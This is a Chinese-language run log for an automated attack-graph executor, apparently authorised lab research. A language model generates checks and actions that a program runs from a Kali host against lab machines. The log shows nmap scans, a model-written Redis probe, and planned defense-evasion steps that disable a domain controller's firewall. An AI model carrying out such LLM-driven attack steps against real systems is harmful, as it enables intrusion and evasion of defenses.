- 执行端：新注册实例 bdc94916e9cf43fba304c2ac35229f65（store=/home/kali/agv-e2-r90/registry；演练端配置 output/e2-endpoint-r90-unknown.json）。
- 中断手法：演练端在发布结果前落 `before_result_publish` 事件并以 exit 74 退出（scripts/e2_unknown_endpoint.py build/install）。
- 现场记录：dispatch 按预期 RuntimeError（endpoint_status=unknown、registration_state=claimed、last_known_execution_state=claimed）；
  恢复 ×2（recovery-001/002.json）：均 status=stopped（exit 2）、results[0].status=uncertain、diagnostics[0].stage=query；
  observations 各一条、observation_status=observed、reason=「the original call has no complete result」。
- 远端铁证（/home/kali/agv-e2-r90/registry/calls/78d18deb…/）：rehearsal-process.jsonl＝child_started＋child_reaped 各 1 次（pid 183186、rc=0、timed_out=false）；
  rehearsal-cutoff.jsonl＝before_result_publish、exit 74；目录内无 result.manifest.json（没有可领的完整结果）。
- 停发复核：kernel.allowed(post, call-e4001-probe)＝False、allowed(pre, call-e2003-probe)＝False，reason=an earlier call is unresolved。
- 离线验证：1081 passed / 1 skipped、ci 4/4（run88c 落码时读数；本节只登记真跑，不改代码）。

覆盖边界：本节覆盖「真实 unknown → 观察记录 → 停发」主干；unknown 不结算，恢复到完整结果与补结算的路径不在本节范围；E3／E4 入口真跑归后续批次。

关键文件 SHA256：

```text
recovery-001.json
853d436098c9ea61e859f1c8d5acf60545b261d657490752494832f6f1c664d4

recovery-002.json
bba3487da529ebd55f6e80e88781cdc9b9b6f2ef30ee7deaba968c257062b7ac

calls.jsonl
af7f0deca2320b4fbc5428ef9f962040154c0ba6250f0289a4761f5b0b5391d1

call-e2001-7e6ee4e1f699/request.json
fabcde250ba6c2755e86b5982750456656255a0129877a3ad6a463608f0ea144

call-e2001-7e6ee4e1f699/acceptance.json
863899b93ab777f6bf272bced43ba5a56b3d53fe428f6aeb4677ef793aacb6c1
```


## 单节点 E2/E3/E4 三阶段真跑 · run94（2026-09-22，真实模型接口）

结论：单叶（node 14）三阶段各自完成一次真实持久调用并由程序判定——E2 pre 判定 satisfied、
E3 action 只留完整回执与结算（无 verdict，按设计）、E4 post 判定 satisfied；三条调用远端全部 settled，
六次显式恢复（每阶段 ×2）均为幂等读回、未重打。本演练是七阶段执行器的**模型入口**真跑：
pre 检查候选、实施候选、后校验候选全部由真实模型接口生成，程序只做逐项校验、封存、派发、判定。
不产生节点结论，不提交节点成功，不宣称全图验收。

- 代码：d05acf5b0da4a00f2876e1648fb6cfcf2e87a87b（含本轮两处放宽：r88i 参数候选 null 按「未提供」；r88k E4 actions 非空时 reason 可省略）。
- 消费目录：output/runs/r94-e2e-node14/；上游来源 run：output/runs/r94-src（规划管道真跑，采用节点 14，ready 集 {14,30}）。
- run_id=r94-src，node_id=14；三段 call_id：call-e2001-763283207b39（pre）、call-e3001-6c9a78271091（action）、call-e4001-e1dc81fc492b（post）。
- 模型：deepseek-chat @ https://api.deepseek.com（回包 model=deepseek-flash），retries=0，超时 90s；
  传输凭据只从环境变量读，全部产物与转录零命中。
- 执行端：新注册实例 27b4fb42354148ef8665577b5cf8ef07（store=/home/kali/agv-e2-r94/registry；配置 output/e2-endpoint-r94.json）。
- 现场记录（本地，三阶段各一次 run ＋每阶段恢复 ×2）：
  - E2 run：pre_satisfied（exit 0），三闸 freshness/target/effect 全 pass，verdict=satisfied，settled；
  - E3 run：collected（exit 0），rc=0，完整回执，settled，verdict 为空（按设计）；
  - E4 run：satisfied（exit 0），后校验调用 rc=0，按节点完整要求判定 satisfied；主张字段 {success:null, reason:null} 只作记录，不参与判定；
  - 恢复：E4/E2/E3 各 recover ×2，六次全 exit 0 且状态与首次一致（恢复产物 6 份：e4-recovery-×2、recovery-001/002、e3-recovery-×2）。
- 远端铁证（/home/kali/agv-e2-r94/registry）：calls 表 3 行（pre/action/post，state=settled，conflicts=0）；
  三个 call 目录各有 call.json＋result.manifest.json；三段 argv 各自带本调用 marker（agv763283207b／agv6c9a782710／agve1dc81fc49），
  六次恢复后三份 call.json 的 started_at（14:53:23／14:53:30／14:53:32 UTC）与 stdout 长度不变（未重打）。
- 观测（nmap 7.93，自 kali@192.168.52.128 观测 192.168.52.10:6379）：state=open、state_reason=syn-ack。
- 同夜三次停止（均按设计停在局部，修好后复跑，修复均已入码）：
  - run92：E2 因真实模型回 source_ref=null 被拒（r88i 后按「未提供」处理）；E4 因取证项 reason 非空被拒（r88j 提示词补齐）；
  - run93：E4 因 actions 非空但 success=null、reason=null 被拒（r88k 放宽：没有主张就没有理由；false 仍必须非空）。
  - r85-p3：规划管道用 deepseek-flash 时模型回空内容（推理预算耗尽），本地停止、不入 E1；下一次以 deepseek-chat 重跑成功（r92-src 起）。
- 离线验证：1093 passed / 1 skipped、ci 4/4（落码方本轮读数；本节登记的是真跑，不改代码）。
- 补注（run95 批）：本节目录绑定 d05acf5 的代码与端点；之后的代码改动（caa268a，model.jsonl）使该绑定过期，
  `recover` 只认原绑定——run94 目录不再重跑，重跑另建新 run（见下节 run95）。

覆盖边界：本节覆盖「模型入口三阶段 → 真执行 → 程序判定 → 恢复幂等」主干；E4 多动作／通用回填、
E5 修正循环、端点 unknown 的生产恢复停发不属本节；节点成功提交与全图验收仍是后续批次。

关键文件 SHA256：

```text
e2.result.json
e5106eee9899eafefead931407dd8422dbdfa6d09230a12a3c85814d423d5a20

e3.result.json
20ed8c326bdf8d8bea90f0024fe337e64a0c45d9b3770e1dbf7ddad485aa433b

e4.result.json
6aa8330c18ebd9868c53fc8abec6d33684cf6fea87d647f31686fa33c77c54b0

calls.jsonl
4f0e3fc612f7880c78ffc1c1d67fb70f4824201b7eaa329ae38b992e11152387

e4.model.answer.json
41d32ef5ed7224188aa086d0711bf5afa7e0f1b867ca3e0d7a2172f0ea11c440

binding.json
c05160a1c23c0b5a48eec507675ed55f42e28bfee62ab6a8b8a36b58658ab0f9

e2-001/adopted_input.json
bcb11c4e4fc6f29fee1dc00f0072f0d44a491c396532e94c037494fb3ab896f7
```

## 单节点 E2/E3/E4 三段真跑 + 模型调用日志 canary · run95（2026-09-22，真实模型接口）

结论：本轮 canary 验证 caa268a 的 `model.jsonl`（模型调用单行日志）——规划与三段真跑
（pre/action/post）每次模型调用都在 `<run-dir>/model.jsonl` 落下正好一行生成记录；
七次恢复（每阶段 ×2 + 对照 ×1）前后，远端三份 call.json 的 started_at 完全一致，未重打。
本演练不产生节点结论，不提交节点成功，不宣称全图验收。

- 代码：caa268a（模型调用单行日志 model.jsonl：ROW_KEYS 十一稳定键、policy/seam/script 三来源、
  失败行不吞、缺 run_dir 不写；新增 tests/test_model_log.py 11 例。落码方读数：pytest 1104 passed / 1 skipped、ci 4/4）。
- 规划来源 run：output/runs/r95-src（run_id=r95-src，deepseek-chat，采用节点 14，ready 集 {14,30}）；
  该目录 model.jsonl 一行：plan_next_node（source=seam、ok=true、attempts=1、609ms、11641/17 tokens）。
- 消费目录：output/runs/r95-e2e-node14；三段 call_id：call-e2001-3bc79e4bcb0c（pre）、
  call-e3001-83635db189b5（action）、call-e4001-0c496f12fb1a（post）。
- 执行端：新注册实例（store=/home/kali/agv-e2-r95/registry；配置 output/e2-endpoint-r95.json）。
- model.jsonl 三行（消费目录，均 ok=true、attempts=1、回包 model=deepseek-flash）：
  - generate_pre_checks（source=seam、827ms、789/47 tokens）；
  - generate_action（source=script、500ms、701/42 tokens）；
  - generate_post（source=script、671ms、818/57 tokens）。
- 现场记录：E2 pre_satisfied（三闸 freshness/target/effect 全 pass）／E3 collected（rc=0、settled、verdict 空，按设计）／
  E4 satisfied（claim {success:null, reason:null} 只作记录，不参与判定）；恢复：E2/E3/E4 各 recover ×2，六次全 exit 0 且状态一致；
  对照轮 recover 各 ×1（第 7/8/9 次），前后远端 started_at（15:09:51／15:09:56／15:10:01 UTC）逐项一致（IDENTICAL: True）。
- 远端铁证（/home/kali/agv-e2-r95/registry）：表计数 meta=1／calls=3／conflicts=0；三段 call 全 settled（reason 空）；
  三段 argv 各自带本调用 marker（agv3bc79e4bcb／agv83635db189／agv0c496f12fb）。

关键文件 SHA256：

```text
e2.result.json
b597af91769b46bc367fcbcd3ed91ae71d630bdfc9e06191be4c56e867c438b7

e3.result.json
3b676786bbe1eb566575ce299f56bb42b63f5800c07efc4770155e48dfc2ffad

e4.result.json
8416efafce169a688e9b39aecf73ce86ae09bfe8c28f1580d3093f772c0adbfe

model.jsonl（三行：pre/action/post）
3ad06ed934d804df3c3cefa32e1334c514b4380d9b7f0e052713725941aeac67

binding.json
5e27cfc4de4e2ae3e4dfe8cbc18005eb9aad25a8f5f22f0a38862ad9700d8382

e2-001/adopted_input.json
296efa58f27a218e431d66a932ee458ac176c46b48f32b29e8433a2ee06002a9

r95-src/planner.output.json（采用计划）
e04990e61ed09e24079eb4395bd297ca900aaed2d4aa55cb1ad8d472f96d9ad0

r95-src/model.jsonl（一行：plan_next_node）
9b50b393c3dfa99283364334a1138421e4217b03224889106d1b8a3d5fb53473

e2-endpoint-r95.json
954986c3ec88d43f2cfcf35317c79c5dce1c662ae9caf28fca826d475d56e6cc
```

## E1 输入去图（四键契约）＋全链复验 · run96（2026-09-22，真实模型接口）

结论：2026-09-22 裁定落地——E1 阶段输入**不再携带完整图**（四键：`decision / next_node_id /
change_note / run_id`；图由程序按 `run_id` 绑定，经 `document` 参数显式传入检索函数）。
新契约下规划管道与 E2/E3/E4 三段全链复跑通过；期间暴露并修复一个模型接入层缺陷
（服务端 deepseek-flash 已转推理变体，`generate_post` 稳定烧满 1600 预算 → 完成预算
1600→4000）。本演练不产生节点结论，不提交节点成功，不宣称全图验收。

- 代码：**f066c01**（E1 四键契约：`retrieval.py` 四键＋严格形状检查、`run_stage(…, *, document, …)`、
  `planning_pipeline` 组装去图、`run_e2_pre` 源件校验改四键、StageInputTests 重写＋新用例
  「旧五键被拒」、`specs/008/executor.md` §1 同步）＋ **48a7375**（`MAX_COMPLETION_TOKENS`
  1600→4000 与 `agent_contract.md` 同步）。
- 规划来源 run：`output/runs/r96-src`（run_id=r96-src；`e1.input.json`＝**99 B 四键**，
  sha256 `d663e89b…`；`planner.input.json` 仍六键含完整图 45,494 B，sha256 `d51bd64f…`；
  采用节点 14；`model.jsonl` 一行 plan_next_node：seam、ok、906ms、11641/17 tokens）。
- 全链三次演进（同一源件 r96-src）：
  - `r96-e2e-node14`：E2 **pre_satisfied**；E3 首次遇模型空响应（`completion_tokens==1600`
    全花在推理上），按脚本纪律（请求唯一）不再重跑，留档。
  - `r96b-e2e-node14`：E2 **pre_satisfied** / E3 **collected**；E4 稳定复现同一空响应
    （受控探针：同一请求 3/3 空；该请求与 r95 成功件逐字段相同）→ 定位为预算缺陷（见上）。
  - `r96c-e2e-node14`（新预算生效）：E2 **pre_satisfied** / E3 **collected** / E4 **satisfied**；
    三段真 call：`call-e2001-1cfdca6b2a0e`（pre）／`call-e3001-c974b182283a`（action）／
    `call-e4001-66c6e9178142`（post）；E4 三闸 freshness／target／effect 全 pass；
    post marker `agv66c6e91781`。
- 远端铁证（`/home/kali/agv-e2-r96c/registry`）：表计数 meta=1／calls=3／conflicts=0；
  三段全 `settled`（reason 空）。新实例注册（e2-endpoint-r96 系列三配置：r96／r96b／r96c）。
- 模型口径：deepseek-flash（https://api.deepseek.com、timeout 90、retries 0）；
  服务端回复现含 `reasoning_content`，usage 带 `reasoning_tokens`（推理变体）。
- 预算修复现场：E4 请求在 1600 下 `finish_reason=length`、`content` 空、`reasoning_content`
  7,033 字符；同请求 4000 下 `finish_reason=stop`、reasoning 2,382 tokens＋content 169 字符，
  合法 JSON。D37 决策 3（1600）按新现场更新为 4000。
- 索引：adoption_evidence 重建 **147 行**（E144 r96-e2e-node14／E145 r96-src／
  E146 r96b-e2e-node14／E147 r96c-e2e-node14）。E145 推定版本 85d4aadf 系提交（15:07:29）
  与运行（15:06:53）数十秒交错所致；实际工作树内容即 f066c01——以本节为准。
- 诚实标注：四键只改「阶段载荷」；运行目录仍存 `graph/json/Hongri7_v2.action_graph.json`
  为程序侧唯一权威图（E1 由 `document` 参数接收同一对象）。历史 run（r95 及之前）五键件
  按原版本解释、不复算、不加兼容读取。

关键文件 SHA256：

```text
r96-src/e1.input.json（99 B 四键）
d663e89b230b31e205189db4d7988f0a9ae0fc690aa37613f7ed5d45d38601b7

r96-src/planner.input.json（45,494 B 六键仍含图）
d51bd64f2916153b3d5666ee3575a691c48b8f7318e383b0be308d7bcd279f53

r96-src/planner.output.json
e04990e61ed09e24079eb4395bd297ca900aaed2d4aa55cb1ad8d472f96d9ad0

r96-src/e1.materials.json
70ecf9f1e889ad8ebc5f6cd78e0b251f1a867ea1b9a2f9c6d3332701b076aa77

r96-src/model.jsonl（一行：plan_next_node）
2f6c29eb3fdeac622b9ceaf218bfcb08d75f39659c1c290795f79185af3b1252

r96c-e2e-node14/binding.json
6cce42ecf073b966928dd2e5f9cc86e85a81726e8ea396807611a146c318a7cc

r96c-e2e-node14/e2.result.json
d370017f7e4e46ae841dd7fb91767b15d170fda5e16a9f9d1dc1eadf3c1888e5

r96c-e2e-node14/e3.result.json
5270e5387f6bb0f09160b473ce5723d52c1840b5dac8f1d34e0587c8e65ebc64

r96c-e2e-node14/e4.result.json
ce06fe81efed571dbf2a4463133b129b3ebc71be69a557363cac33cfe371e459

r96c-e2e-node14/model.jsonl（三行：pre/action/post）
2339feb3fa3d5004ffeee52d6c9499f2dad8575df8f3cfdacea4e3923d36bb1a

r96c-e2e-node14/calls.jsonl（三段）
1acae5e6ac9851cde90f97c76f2542e751595101e2451e995d987fead362302f

e2-endpoint-r96c.json
1e9de9641945b2bc11f358c4f4b211ef3f75a09b0f09490898ce0c04bdf0e561
```

## E1 材料键 v2 落码实跑 · run97（2026-09-22，真实模型接口）

- 目的：run91 裁定 a/b/f/g 落码后，验证 E1 材料侧新键（`leaf_id／skill_path／score／node_info.source_ip／target_ip`）在真实管道成立，且 E2 读方与内核对账同步改完。
- 代码（`a9d1e6c`）：`src/runtime/retrieval.py`（材料两分支＋行为卡＋node_info IP＋`_selected_score／_ip_literal`）、`src/runtime/e2.py`（`_slot` 读 `leaf_id` 且非空；材料拒绝分支）、`src/runtime/e2_kernel.py`（冻结材料 `pre_plan／allowed／intent` 读 `slot["leaf_id"]`；请求侧仍 `leaf_ref`）；测试 4 文件更新＋9 例新增：**1114 passed / 1 skipped**，ci 4/4。
- 实跑：`output/runs/r97-src`（deepseek-flash，timeout 90、retries 0；一次 `plan_next_node` 968ms／11,641 prompt／17 completion tokens），采用节点 `14`（与 r95／r96 同路径可比）。
- E1 真件（v2）：`e1.materials.json` 1,546 B——`node_info`：`source_ip=192.168.1.102`（资产表 attacker）、`target_ip=192.168.52.10`（主机映射 web1）、`attack_id=null`、`port=6379`（图端口）；`leaf_materials[0]`：`leaf_id="15"`、`score=null`、`skill_path=skills/pre.nmap_tcp_probe/`；`action_material`：`score=4`（锁定候选分，与 `retrieval.jsonl` 的 action 行一致）；`gaps=[]`；`exemptions` 仍是程序侧记录且保留旧键 `leaf_ref`（不改名）。
- E2 读方本地验收（无靶机调用）：`e2.make_context(r97-src 材料, document＝r97-src 冻结图, host_map, assets)` → 单槽 `('/nodes/4/dependencies/0', '15', 'pre.nmap_tcp_probe')`，`expected.target_host=192.168.52.10`（回图重算，不读材料 inputs）。
- 诚实标注：本 run 只到 E1；E2／E3／E4 真链未重跑（本机 shell 无 `AGV_SSH_PASSWORD`，远端会话不可用），故无目标侧判定；r96c 的三段结论仍以 run96 节为准。旧键真件（r95／r96）按原版本解释、不复算、不加兼容读取。
- 索引：adoption_evidence 重建 **148 行**（E148 r97-src）。E148 的 `code_version` 记为 `553a1489 (推定)`——机制按「运行时刻之前的提交」推定，而 v2 落码提交 `a9d1e6c` 在运行之后数十秒；实际工作树内容即 `a9d1e6c`，以本节为准。

关键文件 SHA256：

```text
r97-src/e1.input.json（99 B 四键）
634536d71e263c2e301d797511617da3368232a6f9fd4c20cb1a7f1e3b59ac3e

r97-src/e1.materials.json（1,546 B v2 键）
369d2918e9f0b8983068e639b0ceaab9ac0b68717aa64db79a0ba8bbddb918dd

r97-src/planner.output.json
e04990e61ed09e24079eb4395bd297ca900aaed2d4aa55cb1ad8d472f96d9ad0

r97-src/model.jsonl（一行：plan_next_node）
1f95adeb6162496507cf2d11a60725aefe737cbbfe1ae4605df6611ce932e358

r97-src/retrieval.jsonl（两行：fact／action）
241c132ed93a5cf95dbc59496a95339a798dfaab6988fd77220b94493a10251b
```

## E2 模型投影 v2 落码（删 expected）· run98（2026-09-22，本地验收）

- 目的：run92 桥裁定「模型侧删 `expected`、程序侧完整保留；`parameters` 契约（type/required/desc/const/可选行）不动」落码后，验证 E2/E3/E4 共用投影 `_slot_view` 只输出七字段，程序侧判定材料不受影响。
- 代码：`src/runtime/e2.py`（`_slot_view` 删 `expected` 投影行、docstring 改七字段）、`src/agents/model.py`（`generate_pre_checks` 提示句不再提 expected facts；E3/E4 提示词无需改）；测试 `tests/test_runtime_e2.py`（E2 视图断言＋E3/E4 context 断言）、`tests/test_model_seam.py`（提示词旧短语已除）：**1114 passed / 1 skipped**，ci 4/4。
- 验收（`output/runs/r98-src`，消费 r97-src 材料＋冻结图＋host_map/assets，`e2.make_context`，无模型/远端调用）：`e2.view.json` 1,378 B。
  - 模型材料行七字段：`artifact_rules／assembly／description／gap／method／parameters／skill_id`（无 `expected`）。
  - `parameters` 三行：`target_host=192.168.52.10`（`host_ref`，必填）／`port=6379`（`port`，必填）／`source_ref=null`（`string`，可选）。
  - 程序侧：`slot.expected.target_host=192.168.52.10`（回图重算）、`allowed.target_host` 含 `192.168.52.10`（绑定照旧）。
- 诚实标注：本地验收不调模型、不进远端；E3/E4 由 context 单测覆盖（`post_materials/observations` 接线不在本轮）；模型生成质量与远端链路不据此宣称。
- 索引：adoption_evidence 重建 **149 行**（E149 r98-src）。E149 的 `code_version` 记为 `fa112cf (推定)`——机制按运行时刻之前的提交推定；实际工作树＝本轮 run92 落码（提交紧随本节）。

关键文件 SHA256：

```text
r98-src/e2.view.json（1,378 B 七字段模型投影）
1cf1cf30c8c2055384cd4de8deb8646b25d3300bc43bcb74338b9f8f2cc5b067
```

## E1/E2 多叶节点实跑（节点 2 · 3 片叶）· run99（2026-09-22，真实模型接口＋真实靶机）

- 目的：爷爷要求把 E1/E2 的示例节点从 14 号（1 片叶的特例）换成典型多叶节点；顺带把「E2 第 1 片来源验不过」的真实行为完整跑出来。
- 选定节点：2 号＝`RULE 12 (Impair Defenses – Disable or Modify Tools – T1562.001)`，pc1→dc，scm/tcp/445，`case_id=disable_firewall_credentialed`，`impact=disableFirewall(dc)`；3 片应检叶、3 张不同卡。
- 实跑一（E1，纯本地确定性）：`output/runs/r99-src`
  - 入口四键（无图；document 以参数传入＝r97-src 冻结图）：`e1.input.json` 98 B。
  - 材料三片叶全锁定：`39 hacl(pc1,dc,tcp,445)`→`pre.nmap_tcp_probe`；`40 networkServiceInfo(dc,scm,tcp,445,system)`→`pre.impacket_scm_query`（形态 `windows_service_rpc`）；`42 isFirewall(dc,exit)`→`pre.netsecurity_firewall_state`（形态 `firewall_profiles`）。
  - 另：豁免 `hasAccount(dc,…)`（66 轮政策）、行为回填 `ttpExists(dc,scm,…)`、行为卡 `evasion.netexec_firewall_off`（score=12）、`gaps=[]`。
- 实跑二（E2 真链）：`output/runs/r99-e2e-node2`（模型 generate_pre_checks 一次＋封存＋Kali 执行＋三闸判定；endpoint＝`e2-endpoint-r96.json`，bundle sha 校验通过；模型 deepseek-flash 6,047 ms）。
  - 模型真件（输出1）：`checks[]` 三条与三片叶同序——前两条 `tool_invocation`；第三条（`assembly=model` 卡）如实拒绝，理由「Model card does not declare an entry, interpreter, or files; only a method template is provided」——属 r93 v2 裁定里尚未落码的那批（entry/interpreter/files 接线）。
  - 执行与判定（输出2）：第 1 片在 Kali 真跑（nmap 192.168.93.30:445 → `state=open, syn-ack`），证据 `observed_source=kali@192.168.52.128`；效应闸判 `uncertain`：`the probe ran from kali@192.168.52.128 while the leaf asks for pc1: a result from the wrong vantage decides nothing`（来源基准＝图里叶的 vantage，不认执行参数）。一次拒绝即停：第 2、3 片记 `not_executed`（`an earlier slot stopped this adoption`）。`e2.result.json`：`status=stopped, blocked=true`。
- 靶场侧手测（19:2x，Kali 直连；本轮同机）：`Get-NetFirewallProfile -PolicyStore ActiveStore` 三档 `Enabled=1`（与 `isFirewall(dc,exit)` 期望一致，说明卡片逻辑与靶场状态对得上）；`nmap -sV -p445` 对 93.30／93.40 均 `open/microsoft-ds`。
- 判读（诚实标注）：这次停住不是卡片或程序出错，是两个已登记的缺口咬到了：①「跨跳板机通达性（hacl）」需要一个来源侧会话/通道＋一张能在跳板机上执行的核对卡（会话供给＋技能库）；②`model` 装配卡的 entry/interpreter/files 接线待 r93 v2 落码。E3/E4 未跑（无行动执行）；E2 仅执行第 1 片；模型生成质量与远端链路只按上述真件宣称。
- 索引：adoption_evidence 重建 151 行（E150 r99-e2e-node2 · verdicts uncertain=1；E151 r99-src · dry run）。

关键文件 SHA256：

```text
r99-src/e1.input.json（98 B 四键）
a72747bca808d5337dbe4f3662d4974c98155053cccb72d17d2650c9a35bab88

r99-src/e1.materials.json（3,443 B；三片叶＋豁免＋回填）
3684b17468cf47a28c3f7c300bd26e039d62c7076ac1e8df819de14cf24faca1

r99-src/retrieval.jsonl（两行：fact／action）
a3e945d9cdd43f41ec8edfa658b05f1734a6b902f25211971cf308f0753dde77

r99-e2e-node2/e2.result.json（1,983 B；status=stopped）
ca5cb3b6123b4857b36762f106850c182707b1015e35563c433165319bd5bee1

r99-e2e-node2/model/model-001-generate_pre_checks.json（9,079 B；三条 checks）
17982a7035b1c7f7d92fdbf0d921916b03a9d48e4d15567cfe4e51baba7c5cae

r99-e2e-node2/calls.jsonl（一条：verdict_status=uncertain）
226410a3941ed168cee34e33091eccb3f411e19d3f74b1e3c59a894da93cb109

r99-e2e-node2/model.jsonl（一行：generate_pre_checks）
e715e693a5942fd109758589ad774d337616978e4623ea05cd50dd6c52eb88e0
```

## E2 展示件落码（bridge run94 裁定）· 第 100 轮（2026-09-22）

- 目的：E2o1 真件「看不到执行信息」的验收反馈落码。展示件是增补物：纯模型输出（E2o1.json）保持原样，只给展示副本加「程序执行说明」节；输出 2 的检查明细补「命令」「执行点」。
- 交付（项目仓代码）：
  - `src/runtime/execution_view.py`：从封存记录渲染执行说明节——严格 printf 标记包装剥壳（其余 argv 原样一行、不猜）、参数用封存有效值、`runs_on` 取调用记录 vantage、已脱敏值不回显；未形成封存请求的槽一律 `not_executed` 并照实携带缺口原因。
  - `tests/test_execution_view.py`：12 用例，形状取自 r99 真件（剥壳／原样／脱敏／缺记录／输出2 关联）。
- 交付（IO 协议目录）：
  - `E2o1.display.json`（2,599 B）：三条候选各带 `execution` 节——叶 39 `sealed`（命令 `nmap -Pn -n -sT --reason -p 445 -oX - 192.168.93.30`，执行点 `kali@192.168.52.128`）；叶 40/42 `not_executed`（原因照实：an earlier slot stopped this adoption）。
  - `E2o2.json`（673 B）：检查明细行补「命令」「执行点」——叶 39 真值；叶 40/42 为 null（未执行不编造）。
- 验证：pytest 1126 passed / 1 skipped（新增 12 用例）；`scripts/ci.py` 4/4。
- 机制边界（r94）：展示件不回喂解析器；`implementation` 字符串化与三态迁移属单独批；远端端点暂只收 fixed 件、model 卡的生成件通道仍为已登记缺口。

关键文件 SHA256：

```text
src/runtime/execution_view.py（8,227 B）
b16bacdc6f3ebca835b9268dcd08c108ed054b571237f660cc47f81b16fd6504

tests/test_execution_view.py（10,020 B）
b2c878020b2975a1cda0313732764e84460050450955198b2d86869003cc0c2e

E2o1.display.json（2,599 B）
2f407689dbf906e046552a4a18932604a7ccadce16c855c261ff6f74076753f9

E2o2.json（673 B）
9839414a2ec2913643831ce73d7f2d1f003e99cf84d0f39e5a1897cf7508c6a9
```

## E2 通道真机闭环（节点 12 · service_version）与 vantage 缺口复现（节点 2）· run101/run105（2026-09-23，真实模型接口＋真实靶机）

- 目的：把 r99 桥裁定的 E2 通道（模型四字段动作包 → 程序装配 → Kali 执行 → 解析 → 三闸判定）在真实靶机上端到端跑通；顺手收掉实跑咬出的两处契约毛刺。
- 实跑一（r101，节点 2 · 3 片叶，混合批）：`output/runs/r101-e2e-node2`（endpoint `e2-endpoint-r101.json`，instance `699c6532…063a`）
  - 一次模型调用（deepseek-flash，2.2s，402 completion tokens）：只有 model 卡（叶 42 firewall）进提示词，两条 fixed 叶（39/40）程序直通、零复述。
  - 叶 42 真件：`tool_call powershell`，`content="-NoProfile -Command \"Get-NetFirewallProfile …\""`，`reason=null`——契约成立、装配通过；因前叶停未到执行。
  - 叶 39（fixed 声明式）真跑：`nmap -Pn -n -sT --reason -p 445 -oX - 192.168.93.30` → `state=open / syn-ack / microsoft-ds`（Kali 真扫 dc:445）；判定三闸 freshness/target pass、effect **uncertain**（`the probe ran from kali@192.168.52.128 while the leaf asks for pc1`）。
  - 一次停（既有契约）：叶 40/42 `not_executed`（`an earlier slot stopped this adoption`）；`status=stopped, blocked=true`。
- 实跑二（r105，节点 12 · service_version），**全绿**：`output/runs/r105-e2e-node12`（endpoint `e2-endpoint-r103.json`）
  - 前置 E1：`output/runs/r103-src`（planner 在 completed={14} 下选 12；control=192.168.52.128）；叶 17 `networkServiceInfo(web1,redis,tcp,6379,root)`→`pre.service_version`。
  - 模型输出（deepseek-flash）：`code` 形态，`tool="python3"`，完整 Redis RESP probe.py（INFO server）。
  - 程序装配：写 `probe.py`＋`params.json`（绑定值），marker 包装 `python3 probe.py params.json`。
  - Kali 真跑：rc=0、0.032s；证据 `state=open`、`service_product=redis`、`service_version=2.8.17`、真实 banner（`redis_version:2.8.17`）。
  - 判定：三闸全 pass（effect：`service_matches_expected`）→ `status=pre_satisfied`、`blocked=false`。
  - 历史输出；只覆盖服务识别，原叶 root 条件未答，见第110轮更正。
- 过程修复（真件驱动，两个都被实跑咬出来）：
  1. run100/r101：可执行项上带杂散 `reason` 曾整批 block → `parse_action` 改为丢弃不拒（契约仍为「reason 只属缺口」）。
  2. run104：`code` 形态 `tool=null` 被拒 → 契约改为「code 可留空 tool；卡只声明一个解释器时由程序采用」＋提示词写明「tool 填解释器名」。
  3. `pre.netsecurity_firewall_state` 卡补 `execution.tools=["powershell"]`＋SKILL.md 执行点说明（执行点须为目标平台）。
- 诚实标注与缺口：
  - r101 叶 39 的 uncertain＝**已登记缺口**（跨跳板 vantage：`hacl(pc1,dc,…)` 需要 pc1 侧通道，属会话供给线），不是本轮代码缺陷；与 r99 旧码结论一致。
  - r101 叶 42 在 kali 直达链无 PowerShell 通道（如实；通道缺位时该卡不成立）。
  - r104 是被拒件（code 空 tool），作为 r105 修复的前身留档：`output/runs/r104-e2e-node12`。
  - 模型输出均为 deepseek-flash 真实生成；`service_version=2.8.17` 为靶场真实读数。
- 回归：pytest 1143 passed / 1 skipped；`scripts/ci.py` 4/4。

关键文件 SHA256：

```text
runs/r101-e2e-node2/e2.result.json (2,010 B)
06402f6580af6a829209cab65cc19dfd3a56f4abfd058d1c0b0e1e5356ed60b8

runs/r101-e2e-node2/call-e2001-9cb2c57b9ebd/request.json (1,373 B)
7fe56d8467bd5866132212363d0988344a1d123315c1be8ff4b20492a8a5dd88

runs/r101-e2e-node2/call-e2001-9cb2c57b9ebd/envelope.json (1,191 B)
8ef3e210cfaf40f8ceaecd677df2335d10d9e59940ec0e2bd596c43e868eba61

runs/r101-e2e-node2/model/model-001-generate_pre_checks.json (4,968 B)
b07fb71017280e6df88d62fde95579ebda15a140381db82f9ae034b79d9bad48

runs/r103-src/e1.materials.json (2,076 B)
3eab42b27940cbfda90d54830336a5f17eca2d4de3260a7f2b96051ddddb379e

runs/r103-src/planner.output.json (76 B)
73507dc399a64db4d35f7f21ca51f5868386d4c8a588c36085938907703c0bbd

runs/r105-e2e-node12/e2.result.json (1,376 B)
d7b1b515560e22043b2917082e9c2728309f748cca9cf23222b153c9f050ba77

runs/r105-e2e-node12/call-e2001-eb5800f7b3d6/request.json (4,284 B)
e576527a168b6b9cf461d43899e29cc30140b7769f6c14298040685b189849c4

runs/r105-e2e-node12/call-e2001-eb5800f7b3d6/envelope.json (1,597 B)
2386e8acf901101d20dac032ae706b718285f72f36f736e31bd37fbeb239de56

runs/r105-e2e-node12/model/model-001-generate_pre_checks.json (10,135 B)
d94aa51ae7507b509354897ff367a9deb45e333c4626c21e276f156d4fc07548

```

## 批次4 卡片迁移：8 张 pre 卡迁 r99 骨架 · 第 107 轮（2026-09-23，离线验收）

- 范围（全部 E2 可达 pre 卡）：`pre.tool_present`、`pre.session_identity`、`pre.credential_valid`、
  `pre.cim_process_info`、`pre.docker_inspect`、`pre.posix_path_access`、`pre.impacket_scm_query`、
  `pre.netsecurity_firewall_state`。
- 机器契约（skill.json）：`judge` 改为单一判据名（旧 gates 对象仅留兼容读法）；删除 `notes`、
  参数 `desc`、`output.raw`；`output.evidence` 只保留技能特有字段（公共回执字段由运行层给出）；
  model 卡补 `execution` 声明（`tools` 或 `entry`+`interpreters`，含 `timeout`）。
- 卡面（SKILL.md）：迁 r99 骨架（何时用／怎么做／怎么判／通用坑点／实机验证记录）；
  pilot 卡的历史明细仍留在库外索引（`adoption_evidence.tsv`），正文不含实例词与调用锚点。
- 通用性随批整改：`scripts/ci.py` 的覆盖校验不再绑定单一靶场图（`--graph` / `AGV_COVERAGE_GRAPH` /
  output 下自动发现）；`src/runtime/session.py` 的 webshell 客户端与模式改为部署配置
  （`AGV_WEBSHELL_CLIENT` / `AGV_WEBSHELL_MODE`），缺省不再回落到某个专用客户端。
- 离线验收：`pytest` 1145 passed / 1 skipped；技能卡形态守线（r99 骨架、场景词）通过；
  技能索引与 schema 校验通过。
